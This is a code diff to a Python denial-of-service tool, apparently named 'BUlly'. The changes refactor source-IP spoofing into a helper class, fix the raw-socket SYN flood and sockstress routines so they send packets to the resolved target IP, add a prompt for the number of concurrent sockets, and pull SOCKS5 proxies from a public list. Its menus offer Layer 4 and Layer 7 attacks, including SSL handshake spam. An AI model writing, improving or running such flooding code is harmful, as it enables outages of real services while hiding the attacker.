@@ -27,6 +27,39 @@ from impacket import ImpactDecoder, ImpactPacket
 
 RED,WHITE,GREEN,END =  '\033[1;91m', '\33[1;97m','\033[1;32m', '\033[0m'
 
+class Tool : 
+    
+    staticmethod
+    def clear() : 
+        
+        if os.name == 'nt' :
+            
+            os.system('cls')
+            
+        elif os.name == 'posix' :
+            
+            os.system('clear')
+            
+        else : 
+            
+            pass 
+        
+    @staticmethod
+    def ip_generator() : 
+    
+        addr_parse = [0, 0, 0, 0] 
+
+        addr_parse[0] = str(random.randint(1,197)) 
+        addr_parse[1] = str(random.randint(0,255)) 
+        addr_parse[2] = str(random.randint(0,255))
+        addr_parse[3] = str(random.randint(1,254))
+        
+        return '.'.join(addr_parse)
+    
+    @staticmethod
+    def spoof_ip() : 
+        
+        return Tool.ip_generator()
 
 class Proxy :    
    
@@ -43,7 +76,9 @@ class Proxy :
             filename = "sock5.txt"
 
             if  filename not in files:    
-                    
+                
+                print(RED + '==> "sock5.txt" not found trying to get file '+ END)
+                   
                 req = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all').text
                 
                 with open('sock5.txt','w',encoding='utf-8') as file :
@@ -143,34 +178,18 @@ class Target:
         
         return 30 
     
-        
-    @staticmethod
-    def spoof_ip() : 
-        
-        addr_parse = [0, 0, 0, 0] 
-    
-        addr_parse[0] = str(random.randint(1,197)) 
-        addr_parse[1] = str(random.randint(0,255)) 
-        addr_parse[2] = str(random.randint(0,255))
-        addr_parse[3] = str(random.randint(1,254))
-        
-        return '.'.join(addr_parse)
-    
-    
     @staticmethod
     def cfg() : 
         
         print(RED +f''' 
-Host Name  => {Target.hostname()}
+            \rHost Name  => {Target.hostname()}
 
-Ip Address => {socket.gethostbyname(Target.hostname())}
+            \rIP Address => {socket.gethostbyname(Target.hostname())}
 
-Attack Port => {Target.port()}
-
-Socket Count => {Target.socket_count()}
-
-Spoof IP = >  {Target.spoof_ip()}  
-    ''' +END)
+            \rAttack Port => {Target.port()}
+             
+            \rSpoof IP =>  {Tool.spoof_ip()}
+                ''' +END)
 
 
 
@@ -377,18 +396,22 @@ class Payload_Generator :
         return packet
 
 
+
+
 class Layer4 : 
     
     
-    def __init__(self,proxy) :
+    def __init__(self,proxy,socket_count) :
         
         self.target = Target.hostname()
         
+        self.dst_ip = socket.gethostbyname(self.target)
+        
         self.port = Target.port()
         
-        self.socket_count = Target.socket_count()
+        self.socket_count = socket_count
         
-        self.spoof_ip = Target.spoof_ip()
+        self.spoof_ip = Tool.spoof_ip()
         
         self.socket_list  = []    
         
@@ -507,17 +530,15 @@ class Layer4 :
     
         sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1) 
             
-        sock.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
-
         return sock 
     
 
 
-    def syn_flood(self) :   
+    def syn_flood(self) :  
 
         print(GREEN + '[I] Syn flood started' + END )
         
-        _payload = Payload_Generator.syn(self.spoof_ip,self.target,self.port)
+        _payload = Payload_Generator.syn(self.spoof_ip,self.dst_ip,self.port)
         
         for num in range(self.socket_count) :
            
@@ -552,15 +573,15 @@ class Layer4 :
                 
                 for sock in self.socket_list :
                     
-                    sock.sendall(str.encode(_payload))
+                    sock.sendall(_payload)
 
     def sockstress(self) : 
 
         print(GREEN + '[I] Sockstress started' + END )
         
-        _payload0 = Payload_Generator.syn(self.spoof_ip,self.target,self.port)
+        _payload0 = Payload_Generator.syn(self.spoof_ip,self.dst_ip,self.port)
         
-        _payload1 = Payload_Generator.ack(self.spoof_ip,self.target,self.port)
+        _payload1 = Payload_Generator.ack(self.spoof_ip,self.dst_ip,self.port)
         
         for num in range(self.socket_count) :
            
@@ -595,9 +616,9 @@ class Layer4 :
                 
                 for sock in self.socket_list :
                     
-                    sock.sendall(str.encode(_payload0))
+                    sock.sendall(_payload0)
 
-                    sock.sendall(str.encode(_payload1))
+                    sock.sendall(_payload1)
     
     def run(self) : 
         select = int(input(WHITE +'''
@@ -610,7 +631,7 @@ class Layer4 :
 
             \r4 => Sockstress
             \r------------------------------------------ 
-            ''' + END ))
+            \n==>''' + END ))
 
         if select == 1 : 
             
@@ -638,13 +659,13 @@ class Layer4 :
 class Layer7 : 
     
     
-    def __init__(self,proxy) : 
+    def __init__(self,proxy,socket_count) : 
         
         self.target = Target.hostname()
         
         self.port = Target.port()
         
-        self.socket_count = Target.socket_count()
+        self.socket_count = socket_count
         
         self.socket_list  = []    
 
@@ -748,7 +769,7 @@ class Layer7 :
 
                 \r6 => SSL DoS (Handshake Spam)  
                 \r--------------------------------------\n=>
-                '''+ END ))
+                \n==>'''+ END ))
 
         if select == 1 : 
            
@@ -802,15 +823,33 @@ class Layer7 :
        
 def main() : 
     
+    Tool.clear()
+    
+    print(RED + '[I] BUlly started ...\n'+ END)
+    
+    proxy = int(input(RED +'Connect proxy ==> 1 or 0\n===>' + END))
+    
+    socket_count = int(input(RED +'Concurrent socket count==>\n===>' + END ))
+  
+    Tool.clear()
+    
     Target.cfg()
     
-    proxy = int(input( RED +'Connect proxy 1 or 0\n===>' + END) )
+    if proxy != 0 : 
+        
+        print(RED + '\rProxy => True\n'+ END)
+        
+    else : 
+        print(RED + '\rProxy => False\n '+ END)
+        
     
-    l4 = Layer4(proxy)
+    print(RED + f'Concurrent Sockets => {socket_count}'+ END )
+    
+    l4 = Layer4(proxy,socket_count)
    
-    l7 = Layer7(proxy)
+    l7 = Layer7(proxy,socket_count)
     
-    print(WHITE +'-----------------------------------------' + END) 
+    print(WHITE +'--------------------------------------' + END) 
     
     layer = int(input(WHITE+ 'Attack Layer ==>\n=>4\n=>7\n===>>>'+ END))
     
